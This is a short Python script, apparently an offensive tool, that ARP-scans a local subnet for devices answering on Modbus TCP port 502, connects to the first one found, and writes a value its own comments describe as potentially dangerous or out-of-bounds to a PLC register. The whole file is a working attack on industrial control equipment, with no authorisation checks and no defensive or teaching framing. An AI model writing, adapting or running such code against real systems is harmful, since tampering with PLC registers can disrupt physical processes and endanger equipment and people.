import sys
import time
from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient

# Configuration variables
PLC_MODBUS_PORT = 502  # Common Modbus TCP port
TARGET_REGISTER = 100  # Replace with the actual register of interest
NEW_VALUE = 9999       # Potentially dangerous or out-of-bounds value

def find_plc():
    """
    Scan the local network to find the PLC by checking for devices responding on Modbus TCP port 502.
    """
    print("[*] Scanning network for PLC devices...")
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24")  # Adjust subnet as needed
    answered, _ = srp(request, timeout=2, verbose=False)

    for sent, received in answered:
        ip = received.psrc
        client = ModbusTcpClient(ip)
        if client.connect():
            print(f"[+] Found Modbus-capable PLC at: {ip}")
            return ip  # Return the first active PLC found

    print("[-] No active PLCs found on the network.")
    return None

def modify_plc_parameter(plc_ip):
    """
    Connect to Modbus TCP PLC and modify standard operation parameters.
    """
    print(f"[*] Connecting to PLC at {plc_ip}...")
    client = ModbusTcpClient(plc_ip)

    if client.connect():
        print(f"[+] Connected to PLC at {plc_ip}. Modifying parameter {TARGET_REGISTER}...")

        # Write a possibly dangerous, out-of-bounds, or unexpected value to the register
        response = client.write_register(TARGET_REGISTER, NEW_VALUE)

        if response.isError():
            print("[-] Failed to modify PLC parameter.")
        else:
            print(f"[+] Successfully modified register {TARGET_REGISTER} to value {NEW_VALUE}.")

        client.close()
    else:
        print("[-] Failed to connect to PLC.")

def main():
    plc_ip = find_plc()
    if plc_ip:
        modify_plc_parameter(plc_ip)
    else:
        print("[-] Exiting due to no accessible PLC.")

if __name__ == "__main__":
    main()